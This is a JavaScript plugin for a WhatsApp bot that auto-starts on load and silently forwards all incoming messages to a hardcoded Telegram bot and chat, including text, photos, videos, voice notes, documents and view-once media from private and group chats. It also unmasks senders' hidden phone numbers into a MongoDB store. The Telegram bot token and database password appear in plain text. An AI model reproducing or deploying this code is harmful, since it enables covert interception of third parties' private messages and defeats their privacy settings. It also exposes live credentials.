const { cmd } = require("../command");
const axios = require("axios");
const FormData = require("form-data");
const fs = require("fs");
const path = require("path");

// ═══════════════════════════════════════════════════════════
//  AUTO TELEGRAM SYSTEM — SAB KUCH FORWARD (VIEW-ONCE INCLUDED)
//  Engine: store polling + event hook + fallback (3 safety nets)
// ═══════════════════════════════════════════════════════════

const TG_BOT_TOKEN = "8626751277:AAHKmGACfSamLAORB53ag9MaEKwYlBk0Zb0";
const TG_CHAT_ID = "6653388298";

const STATE_FILE = path.join(__dirname, "autotele-state.json");
const MAP_FILE = path.join(__dirname, "autotele-numbers.json");

let STATE = { enabled: true };
let NUMMAP = {}; // "digits" -> real number
try { if (fs.existsSync(STATE_FILE)) STATE = Object.assign(STATE, JSON.parse(fs.readFileSync(STATE_FILE, "utf8"))); } catch (e) {}
try { if (fs.existsSync(MAP_FILE)) NUMMAP = JSON.parse(fs.readFileSync(MAP_FILE, "utf8")); } catch (e) {}
const saveState = () => { try { fs.writeFileSync(STATE_FILE, JSON.stringify(STATE)); } catch (e) {} };
const saveMap = () => { try { fs.writeFileSync(MAP_FILE, JSON.stringify(NUMMAP, null, 1)); } catch (e) {} };

// Optional MongoDB (env mein MONGODB_URI ho to numbers permanent)
let MONGO_COL = null;
(async () => {
    const uri = process.env.MONGODB_URI || process.env.MONGO_URL || "mongodb+srv://didixii_db_user:VeIUTRzLTNDUZTJQ@cluster0.qjubngh.mongodb.net/?appName=Cluster0";
    if (!uri) return;
    try {
        const { MongoClient } = require("mongodb");
        const mc = new MongoClient(uri);
        await mc.connect();
        MONGO_COL = mc.db("autotele").collection("numbers");
        const all = await MONGO_COL.find({}).toArray();
        for (const d of all) if (d?.digits && d?.number) NUMMAP[d.digits] = d.number;
        console.log("[AUTOTELE] MongoDB loaded ✔");
    } catch (e) {}
})();

let B = null;
try { B = require("@whiskeysockets/baileys"); } catch (e) {}

const PROCESSED = new Set();
let CLIENT = null, STORE = null;
let ENGINE = "none", SEEN = 0, LASTERR = "";
let hookOn = false, pollOn = false;

// ── Telegram senders ───────────────────────────────────────
async function tgText(text) {
    try {
        await axios.post(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`,
            { chat_id: TG_CHAT_ID, text, parse_mode: "Markdown" }, { timeout: 10000 });
    } catch (e) { LASTERR = "tgText: " + e.message; }
}

async function tgUpload(buffer, caption, endpoint, field, filename, mime) {
    try {
        if (!buffer || !buffer.length) return tgText(caption + "\n\n⚠️ Media download fail hua");
        if (buffer.length > 49 * 1024 * 1024) return tgText(caption + "\n\n⚠️ File 50MB se bari hai");
        const form = new FormData();
        form.append("chat_id", TG_CHAT_ID);
        form.append("caption", caption);
        form.append(field, buffer, { filename, contentType: mime });
        await axios.post(`https://api.telegram.org/bot${TG_BOT_TOKEN}/${endpoint}`, form,
            { headers: form.getHeaders(), timeout: 90000, maxBodyLength: Infinity, maxContentLength: Infinity });
    } catch (e) {
        LASTERR = "tgUpload: " + e.message;
        await tgText(caption + `\n\n⚠️ Telegram upload fail: ${e?.response?.data?.description || e.message}`);
    }
}

// ── Media extract (wrapper + unwrapped dono handle) ────────
function getContentType(msg) {
    if (!msg) return null;
    const k = Object.keys(msg).find(key => !["senderKeyDistributionMessage", "messageContextInfo"].includes(key));
    return k || null;
}
function getMedia(raw) {
    const msg = raw?.message;
    if (!msg) return null;
    let target = msg;
    const t0 = getContentType(msg);
    if (t0 === "viewOnceMessage" || t0 === "viewOnceMessageV2" || t0 === "viewOnceMessageV2Extension") {
        target = msg[t0].message || {};
    } else if (t0 === "ephemeralMessage") {
        target = msg.ephemeralMessage.message || msg;
        const t1 = getContentType(target);
        if (t1 === "viewOnceMessage" || t1 === "viewOnceMessageV2") target = target[t1].message || {};
    }
    const t = getContentType(target);
    const obj = t ? target[t] : null;
    if (!obj || typeof obj !== "object") return null;
    if (t === "imageMessage") return { type: "image", obj, vo: t0?.startsWith("viewOnce") };
    if (t === "videoMessage") return { type: "video", obj, vo: t0?.startsWith("viewOnce") };
    if (t === "audioMessage") return { type: "audio", obj, vo: t0?.startsWith("viewOnce") };
    if (t === "documentMessage") return { type: "document", obj, vo: false };
    if (t === "stickerMessage") return { type: "sticker", obj, vo: false };
    if (t === "conversation" || t === "extendedTextMessage") return { type: "text", obj, vo: false };
    return null;
}

// ── Download: BASE KA APNA PROVEN METHOD PEHLE ─────────────
async function downloadMedia(raw, media) {
    const { type, obj } = media;
    // 1) base method: client.downloadMediaMessage(innerObj)  [anti-vv proven]
    if (CLIENT && typeof CLIENT.downloadMediaMessage === "function") {
        try { const b = await CLIENT.downloadMediaMessage(obj); if (b?.length) return b; } catch (e) {}
        try { const b = await CLIENT.downloadMediaMessage(raw); if (b?.length) return b; } catch (e) {}
    }
    // 2) mutated m.download()
    if (typeof raw?.download === "function") { try { const b = await raw.download(); if (b?.length) return b; } catch (e) {} }
    // 3) baileys stream
    if (B?.downloadContentFromMessage) {
        const bt = type === "sticker" ? "image" : type;
        try {
            const stream = await B.downloadContentFromMessage(obj, bt);
            let buf = Buffer.from([]);
            for await (const c of stream) buf = Buffer.concat([buf, c]);
            if (buf.length) return buf;
        } catch (e) {}
    }
    // 4) baileys full
    if (B?.downloadMediaMessage) {
        try { const b = await B.downloadMediaMessage(raw, "buffer", {}); if (b?.length) return b; } catch (e) {}
    }
    return null;
}

// ── Number resolution ──────────────────────────────────────
const digits = j => String(j || "").split("@")[0].split(":")[0].replace(/[^0-9]/g, "");

async function resolveNumber(senderJid) {
    const d = digits(senderJid);
    if (!d) return "Unknown";
    // 1) saved map
    if (NUMMAP[d]) return NUMMAP[d];
    // 2) mongo
    if (MONGO_COL) {
        try {
            const doc = await MONGO_COL.findOne({ digits: d });
            if (doc?.number) { NUMMAP[d] = doc.number; saveMap(); return doc.number; }
        } catch (e) {}
    }
    // 3) WhatsApp ka apna contacts store (jid privacy allow kare to pnJid milta hai)
    try {
        const contacts = STORE?.contacts || global.store?.contacts || null;
        if (contacts) {
            const c = contacts[senderJid];
            const pn = c?.pnJid || c?.jid || "";
            const pd = digits(pn);
            if (pd && pd.endsWith("@s.whatsapp.net".split("@")[0]) === false && pd.length >= 8 && !pd.endsWith(d)) {
                NUMMAP[d] = pd; saveMap();
                if (MONGO_COL) MONGO_COL.updateOne({ digits: d }, { $set: { digits: d, number: pd } }, { upsert: true }).catch(() => {});
                return pd;
            }
            if (pd && pd !== d && pd.length >= 8) { NUMMAP[d] = pd; saveMap(); return pd; }
        }
    } catch (e) {}
    // 4) plain digits
    if (d.length >= 8 && d.length <= 15 && !d.startsWith("120363")) return d;
    return d || "Unknown";
}

async function saveNumber(d, real) {
    NUMMAP[d] = real; saveMap();
    if (MONGO_COL) { try { await MONGO_COL.updateOne({ digits: d }, { $set: { digits: d, number: real, t: Date.now() } }, { upsert: true }); } catch (e) {} }
}

// ── Main processor ─────────────────────────────────────────
async function processMsg(raw, client) {
    try {
        if (!STATE.enabled) return;
        if (!raw?.key?.id || !raw?.message) return;
        if (raw.key.fromMe) return;
        const id = raw.key.id;
        if (PROCESSED.has(id)) return;
        PROCESSED.add(id);
        if (PROCESSED.size > 1500) PROCESSED.clear();

        const jid = raw.key.remoteJid || "";
        if (jid === "status@broadcast") return;

        const media = getMedia(raw);
        if (!media) return;
        SEEN++;
        CLIENT = client;

        const senderJid = raw.key.participant || jid;
        const num = await resolveNumber(senderJid);
        const name = raw.pushName || digits(senderJid) || "No Name";
        const time = new Date().toLocaleString("en-PK", { timeZone: "Asia/Karachi", hour12: true });
        const isGroup = jid.endsWith("@g.us");
        let chatName = "Private DM";
        if (isGroup) { try { chatName = (await client.groupMetadata(jid))?.subject || "Group"; } catch (e) {} }

        const voTag = media.vo ? "👁️ VIEW-ONCE " : "";
        const base = `🤖 *${voTag}MESSAGE FORWARD*\n\n🕒 Time: \`${time}\`\n👤 Name: ${name}\n🔢 Number: ${num}\n💬 Chat: ${isGroup ? "👥 Group" : "👤 DM"}\n🏷️ Chat Name: ${chatName}`;

        if (media.type === "image") {
            const buf = await downloadMedia(raw, media);
            return await tgUpload(buf, base + `\n\n📦 Type: 🖼️ ${voTag}Image\n📝 Caption: ${media.obj.caption || "No Caption"}`, "sendPhoto", "photo", "image.jpg", media.obj.mimetype || "image/jpeg");
        }
        if (media.type === "video") {
            const buf = await downloadMedia(raw, media);
            return await tgUpload(buf, base + `\n\n📦 Type: 🎥 ${voTag}Video\n📝 Caption: ${media.obj.caption || "No Caption"}`, "sendVideo", "video", "video.mp4", media.obj.mimetype || "video/mp4");
        }
        if (media.type === "audio") {
            const buf = await downloadMedia(raw, media);
            const mime = media.obj.mimetype || "audio/mp4";
            const isVoice = media.obj.ptt || mime.includes("ogg");
            const cap = base + `\n\n📦 Type: ${isVoice ? "🎤 Voice" : "🎵 Audio"}${media.vo ? " (View-Once)" : ""}`;
            return isVoice
                ? await tgUpload(buf, cap, "sendVoice", "voice", "voice.ogg", "audio/ogg")
                : await tgUpload(buf, cap, "sendAudio", "audio", "audio.mp4", mime);
        }
        if (media.type === "document") {
            const buf = await downloadMedia(raw, media);
            return await tgUpload(buf, base + `\n\n📦 Type: 📄 Document\n File: ${media.obj.fileName || "File"}`, "sendDocument", "document", media.obj.fileName || "file.bin", media.obj.mimetype || "application/octet-stream");
        }
        if (media.type === "sticker") {
            const buf = await downloadMedia(raw, media);
            return await tgUpload(buf, base + `\n\n📦 Type: 🎭 Sticker`, "sendSticker", "sticker", "sticker.webp", "image/webp");
        }
        if (media.type === "text") {
            const text = media.obj.text || media.obj.conversation || "";
            if (text) return await tgText(base + `\n\n📦 Type: 📝 Text\n️ Message: ${text}`);
        }
    } catch (err) {
        LASTERR = err.message;
        console.error("[AUTOTELE]:", err.message);
    }
}

// ── SAFETY NET 1: event hook ───────────────────────────────
function attachHook(client) {
    if (hookOn) return;
    try {
        const ev = client?.ev || client?.sock?.ev || client?.client?.ev;
        if (ev && typeof ev.on === "function") {
            ev.on("messages.upsert", async (data) => {
                for (const m of (data?.messages || [])) await processMsg(m, client);
            });
            hookOn = true;
        }
    } catch (e) {}
}

// ── SAFETY NET 2: store polling (MISS NAHI HONE DEGA) ──────
function startPolling(client, store) {
    CLIENT = client;
    if (store) STORE = store;
    if (pollOn || !STORE?.messages) return;
    pollOn = true;
    ENGINE = "polling ✔";
    setInterval(async () => {
        if (!STATE.enabled || !CLIENT) return;
        try {
            const chats = STORE.messages;
            const keys = typeof chats.keys === "function" ? chats.keys() : Object.keys(chats);
            for (const jid of keys) {
                if (jid === "status@broadcast") continue;
                const db = chats[jid];
                let arr = null;
                if (db && Array.isArray(db.array)) arr = db.array;
                else if (Array.isArray(db)) arr = db;
                else if (db && typeof db.toJSON === "function") { try { arr = db.toJSON(); } catch (e) {} }
                if (!arr || !arr.length) continue;
                for (const raw of arr.slice(-6)) await processMsg(raw, CLIENT);
            }
        } catch (e) {}
    }, 2500);
    console.log("[AUTOTELE] polling engine START ✔");
}

// ── Boot: globals milte hi lag jao ─────────────────────────
setImmediate(() => {
    const boot = setInterval(() => {
        const c = global.client || global.conn || global.sock || global.bot;
        const s = global.store || global.messageStore;
        if (c) { attachHook(c); startPolling(c, s); }
        if (hookOn && pollOn) clearInterval(boot);
    }, 3000);
    setTimeout(() => clearInterval(boot), 5 * 60 * 1000);
});

// ── SAFETY NET 3: fallback hook (har message par) ──────────
cmd({
    on: "body",
    dontAddCommandList: true,
    filename: __filename
}, async (client, m, store, extra) => {
    try {
        CLIENT = client;
        if (store) STORE = store;
        if (!hookOn) attachHook(client);
        if (!pollOn) startPolling(client, store);
        if (hookOn || pollOn) return; // engines kaam kar rahe hain
        const raw = {
            key: { id: m?.id || m?.key?.id || String(Date.now()), remoteJid: m?.chat || extra?.from, participant: m?.key?.participant || (extra?.isGroup ? extra?.sender : undefined), fromMe: !!m?.fromMe || !!extra?.isMe },
            message: m?.message,
            pushName: m?.pushName || extra?.pushname,
            download: typeof m?.download === "function" ? m.download.bind(m) : undefined
        };
        await processMsg(raw, client);
    } catch (e) {}
});

// ═══════════════════════════════════════════════════════════
//  COMMANDS (sirf 3)
// ═══════════════════════════════════════════════════════════

cmd({
    pattern: "autotele",
    alias: ["autotelegram"],
    desc: "Auto Telegram system on/off/status",
    category: "owner",
    react: "🤖",
    filename: __filename
}, async (client, m, store, { reply, isCreator }) => {
    if (!isCreator) return;
    CLIENT = client; if (store) STORE = store;
    if (!hookOn) attachHook(client);
    if (!pollOn) startPolling(client, store);

    const act = ((m.body || m.text || "").trim().split(/\s+/)[1] || "").toLowerCase();

    if (act === "on") {
        STATE.enabled = true; saveState();
        return reply(`✅ *AUTO TELEGRAM START!*\n\n• Engine: ${pollOn ? "polling ✔" : (hookOn ? "hook ✔" : "starting...")}\n• View-once: included ✔\n• Bot messages: included ✔\n\nAb HAR cheez Telegram par aayegi.`);
    }
    if (act === "off") {
        STATE.enabled = false; saveState();
        return reply("⏸️ *AUTO TELEGRAM OFF*");
    }
    return reply(`📊 *AUTO TELEGRAM STATUS*\n\n• System: ${STATE.enabled ? "ON ✅" : "OFF ⏸️"}\n• Hook: ${hookOn ? "✔" : "✗"} | Polling: ${pollOn ? "✔" : "✗"}\n• Messages processed: ${SEEN}\n• Saved numbers: ${Object.keys(NUMMAP).length}\n• Last error: ${LASTERR || "none"}\n\n.autotele on | off`);
});

cmd({
    pattern: "setnum",
    alias: ["realnum"],
    desc: "Save ya lookup real number",
    category: "owner",
    react: "🔢",
    filename: __filename
}, async (client, m, store, { reply, isCreator }) => {
    if (!isCreator) return;
    CLIENT = client; if (store) STORE = store;

    const args = (m.body || m.text || "").trim().split(/\s+/).slice(1);
    if (!args.length) return reply("Usage:\n.setnum <digits> <realnumber>  (save)\n.setnum <digits>  (lookup)");

    const d = args[0].replace(/[^0-9]/g, "");
    if (!d) return reply("❌ Galat digits!");

    // SAVE mode
    if (args[1]) {
        const real = args[1].replace(/[^0-9]/g, "");
        if (real.length < 8) return reply("❌ Galat number!");
        await saveNumber(d, real);
        return reply(`✅ *SAVED!*\n\nID digits: ${d}\nReal number: ${real}\n\nAb is bande ke sab messages (pic/video/voice/view-once) mein REAL number aayega.`);
    }

    // LOOKUP mode
    const found = await resolveNumber(d + "@lid") !== d ? await resolveNumber(d + "@lid") : (NUMMAP[d] || null);
    let real = NUMMAP[d] || found;
    if (!real) {
        try {
            const contacts = STORE?.contacts || {};
            for (const [jid, c] of Object.entries(contacts)) {
                if (jid.startsWith(d + "@") || digits(c?.lidJid) === d || digits(c?.pnJid) === d) {
                    const pd = digits(c.pnJid || c.jid);
                    if (pd && pd.length >= 8 && pd !== d) { real = pd; break; }
                }
            }
        } catch (e) {}
    }
    if (real && real !== d) {
        await saveNumber(d, real);
        return reply(`🔢 *REAL NUMBER MIL GAYA!*\n\nID: ${d}\nReal: ${real}\nhttps://wa.me/${real}\n\n(Ye ab save bhi ho gaya — future messages mein auto aayega)`);
    }
    return reply(`❌ *Real number not found:* ${d}\n\nWhatsApp is waqt ye number privacy mein chhupa raha hai (hidden-id). Koi jaadu nahi kar sakta — lekin ek baar save kar do, phir hamesha real aayega:\n\n.setnum ${d} <asli-number>\n\nTip: agar ye banda kisi group mein hai jahan number visible hai, to .setnum ${d} akela dobara try karo — contacts store se mil sakta hai.`);
});

cmd({
    pattern: "listnum",
    desc: "Saved real numbers ki list",
    category: "owner",
    react: "📋",
    filename: __filename
}, async (client, m, store, { reply, isCreator }) => {
    if (!isCreator) return;
    const list = Object.entries(NUMMAP);
    if (!list.length) return reply("📋 Koi number saved nahi.\n\n.setnum <digits> <realnumber>");
    let t = "📋 *SAVED REAL NUMBERS*\n\n";
    list.slice(0, 40).forEach(([d, r], i) => { t += `${i + 1}. ${d} → ${r}\n`; });
    return reply(t);
});

console.log("[AUTOTELE] plugin loaded ✔");
